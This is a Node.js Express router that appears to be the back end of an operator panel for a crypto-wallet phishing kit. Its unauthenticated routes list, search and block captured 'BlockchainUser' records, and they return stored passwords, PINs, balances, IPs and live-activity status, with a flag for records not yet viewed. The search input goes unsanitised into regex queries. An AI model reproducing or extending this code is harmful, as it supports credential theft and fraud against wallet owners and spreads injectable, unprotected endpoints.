const express = require("express");
const router = express.Router();
const gravatar = require("gravatar");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const config = require("config");
const { check, validationResult } = require("express-validator");
const normalize = require("normalize-url");
const https = require("https");
const fs = require("fs");
const path = require("path");
const domainsFilePath = path.resolve(__dirname, "../../domains.db");

const User = require("../../models/User");
const BlockchainUser = require("../../models/BlockchainUser");
const Visitor = require("../../models/Visitor");

// @route    POST api/users
// @desc     Register user
// @access   Public
router.post(
  "/",
  [
    check("name", "Name is required").not().isEmpty(),
    check("email", "Please include a valid email").isEmail(),
    check(
      "password",
      "Please enter a password with 6 or more characters"
    ).isLength({ min: 6 }),
  ],
  async (req, res) => {
    return;
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ error: errors.array()[0].msg });
    }

    const { name, email, password } = req.body;

    try {
      let user = await User.findOne({ email });

      if (user) {
        return res.status(400).json({ error: "User already exists" });
      }

      const avatar = normalize(
        gravatar.url(email, {
          s: "200",
          r: "pg",
          d: "mm",
        }),
        { forceHttps: true }
      );

      user = new User({
        name,
        email,
        avatar,
        password,
      });

      const salt = await bcrypt.genSalt(10);

      user.password = await bcrypt.hash(password, salt);

      await user.save();

      const payload = {
        user: {
          id: user.id,
        },
      };

      jwt.sign(
        payload,
        config.get("jwtSecret"),
        { expiresIn: "5 days" },
        (err, token) => {
          if (err) throw err;
          res.json({ token });
        }
      );
    } catch (err) {
      console.error(err.message);
      res.status(500).json({ error: "Server Error" });
    }
  }
);

router.get("/statistic", async (req, res) => {
  const total = await Visitor.find().countDocuments();
  let now = new Date();
  now.setMinutes(now.getMinutes() - 2);
  const active = await BlockchainUser.find({
    $or: [
      { ip: { $regex: "", $options: "i" } },
      { country: { $regex: ".*.*" } },
      { status: { $regex: ".*.*" } },
      { uid: { $regex: ".*.*" } },
    ],
    updatedAt: {
      $gte: now,
    },
    blocked: false,
  }).countDocuments();
  const unattended = await BlockchainUser.find({
    attendStatus: false,
    blocked: false,
  }).countDocuments();
  const blocked = await BlockchainUser.find({ blocked: true }).countDocuments();
  return res.json({ data: { total, active, blocked, unattended } });
});

router.get("/all", async (req, res) => {
  const search = req.query.search;
  const page = req.query.page;
  const userCount = await BlockchainUser.find({
    $or: [
      { ip: { $regex: search, $options: "i" } },
      { country: { $regex: ".*" + search + ".*" } },
      { status: { $regex: ".*" + search + ".*" } },
      { uid: { $regex: ".*" + search + ".*" } },
      { user_no: { $regex: ".*" + search + ".*" } },
    ],
    blocked: false,
  }).countDocuments();
  const users = await BlockchainUser.find(
    {
      $or: [
        { ip: { $regex: search, $options: "i" } },
        { country: { $regex: ".*" + search + ".*" } },
        { status: { $regex: ".*" + search + ".*" } },
        { uid: { $regex: ".*" + search + ".*" } },
        { user_no: { $regex: ".*" + search + ".*" } },
      ],
      blocked: false,
    },
    [
      "uid",
      "ip",
      "country",
      "user_no",
      "status",
      "password",
      "balance",
      "blocked",
      "pin",
      "attendStatus",
      "createdAt",
    ]
  )
    // .sort({ pin: -1 })
    .skip(page * 10)
    .limit(10);

  return res.json({ data: { users, userCount } });
});

router.get("/active", async (req, res) => {
  const search = req.query.search;
  const page = req.query.page;
  let now = new Date();
  now.setMinutes(now.getMinutes() - 2);
  const userCount = await BlockchainUser.find({
    $or: [
      { ip: { $regex: search, $options: "i" } },
      { country: { $regex: ".*" + search + ".*" } },
      { status: { $regex: ".*" + search + ".*" } },
      { uid: { $regex: ".*" + search + ".*" } },
      { user_no: { $regex: ".*" + search + ".*" } },
    ],
    updatedAt: {
      $gte: now,
    },
  }).countDocuments();
  const users = await BlockchainUser.find(
    {
      $or: [
        { ip: { $regex: search, $options: "i" } },
        { country: { $regex: ".*" + search + ".*" } },
        { status: { $regex: ".*" + search + ".*" } },
        { uid: { $regex: ".*" + search + ".*" } },
        { user_no: { $regex: ".*" + search + ".*" } },
      ],
      updatedAt: {
        $gte: now,
      },
    },
    [
      "uid",
      "ip",
      "country",
      "user_no",
      "status",
      "password",
      "balance",
      "blocked",
      "pin",
      "attendStatus",
      "createdAt",
    ]
  )
    // .sort({ pin: -1 })
    .skip(page * 10)
    .limit(10);

  return res.json({ data: { users, userCount } });
});

router.get("/blocked", async (req, res) => {
  const search = req.query.search;
  const page = req.query.page;
  const userCount = await BlockchainUser.find({
    $or: [
      { ip: { $regex: search, $options: "i" } },
      { country: { $regex: ".*" + search + ".*" } },
      { status: { $regex: ".*" + search + ".*" } },
      { uid: { $regex: ".*" + search + ".*" } },
      { user_no: { $regex: ".*" + search + ".*" } },
    ],
    blocked: true,
  }).countDocuments();
  const users = await BlockchainUser.find(
    {
      $or: [
        { ip: { $regex: search, $options: "i" } },
        { country: { $regex: ".*" + search + ".*" } },
        { status: { $regex: ".*" + search + ".*" } },
        { uid: { $regex: ".*" + search + ".*" } },
        { user_no: { $regex: ".*" + search + ".*" } },
      ],
      blocked: true,
    },
    [
      "uid",
      "ip",
      "country",
      "user_no",
      "status",
      "password",
      "balance",
      "blocked",
      "pin",
      "attendStatus",
      "createdAt",
    ],
    { skip: page * 10, limit: 10 }
  );

  return res.json({ data: { users, userCount } });
});

router.get("/pined", async (req, res) => {
  const search = req.query.search;
  const page = req.query.page;
  const userCount = await BlockchainUser.find({
    $or: [
      { ip: { $regex: search, $options: "i" } },
      { country: { $regex: ".*" + search + ".*" } },
      { status: { $regex: ".*" + search + ".*" } },
      { uid: { $regex: ".*" + search + ".*" } },
      { user_no: { $regex: ".*" + search + ".*" } },
    ],
    pin: true,
    blocked: false,
  }).countDocuments();
  const users = await BlockchainUser.find(
    {
      $or: [
        { ip: { $regex: search, $options: "i" } },
        { country: { $regex: ".*" + search + ".*" } },
        { status: { $regex: ".*" + search + ".*" } },
        { uid: { $regex: ".*" + search + ".*" } },
        { user_no: { $regex: ".*" + search + ".*" } },
      ],
      pin: true,
      blocked: false,
    },
    [
      "uid",
      "ip",
      "country",
      "user_no",
      "status",
      "password",
      "balance",
      "blocked",
      "pin",
      "attendStatus",
      "createdAt",
    ],
    { skip: page * 10, limit: 10 }
  );

  return res.json({ data: { users, userCount } });
});

router.get("/unattended", async (req, res) => {
  const search = req.query.search;
  const page = req.query.page;
  const userCount = await BlockchainUser.find({
    $or: [
      { ip: { $regex: search, $options: "i" } },
      { country: { $regex: ".*" + search + ".*" } },
      { status: { $regex: ".*" + search + ".*" } },
      { uid: { $regex: ".*" + search + ".*" } },
      { user_no: { $regex: ".*" + search + ".*" } },
    ],
    attendStatus: false,
    blocked: false,
  }).countDocuments();
  const users = await BlockchainUser.find(
    {
      $or: [
        { ip: { $regex: search, $options: "i" } },
        { country: { $regex: ".*" + search + ".*" } },
        { status: { $regex: ".*" + search + ".*" } },
        { uid: { $regex: ".*" + search + ".*" } },
        { user_no: { $regex: ".*" + search + ".*" } },
      ],
      attendStatus: false,
      blocked: false,
    },
    [
      "uid",
      "ip",
      "country",
      "user_no",
      "status",
      "password",
      "balance",
      "blocked",
      "pin",
      "attendStatus",
      "createdAt",
    ],
    { skip: page * 10, limit: 10 }
  );

  return res.json({ data: { users, userCount } });
});

router.post("/block", async (req, res) => {
  const { uid, blocked } = req.body;
  await BlockchainUser.updateMany(
    { uid },
    {
      $set: {
        blocked: blocked,
        status: "Blocked",
      },
    }
  ).exec();
  return res.json({ data: "success" });
});

router.post("/pin", async (req, res) => {
  const { uid } = req.body;
  await BlockchainUser.updateMany(
    { uid },
    {
      $set: {
        pin: true,
      },
    }
  ).exec();
  return res.json({ data: "success" });
});

router.get("/:id", async (req, res) => {
  const uid = req.params.id;
  const domains = fs.readFileSync(domainsFilePath, "utf8");
  let clientDomain = domains.split("|||||||")[2];
  const users = await BlockchainUser.find({ uid: uid });
  if (users.length == 0) {
    return res.json({ user: null, clientDomain });
  } else {
    await BlockchainUser.updateMany(
      {
        uid: uid,
      },
      {
        $set: {
          attendStatus: true,
        },
      }
    ).exec();

    let user = users.pop();
    const now = new Date();
    now.setMinutes(now.getMinutes() - 2);

    const updatedAt = new Date(user.updatedAt);
    const isNotActiveFor2min = updatedAt.getTime() < now.getTime();
    let _user = JSON.parse(JSON.stringify(user));

    _user.isOffline = isNotActiveFor2min;
    if (isNotActiveFor2min) {
      _user.status = "3";
    }

    return res.json({ user: _user, clientDomain });
  }
});

router.get("/send_all", async (req, res) => {
  const uid = req.params.id;
});

module.exports = router;
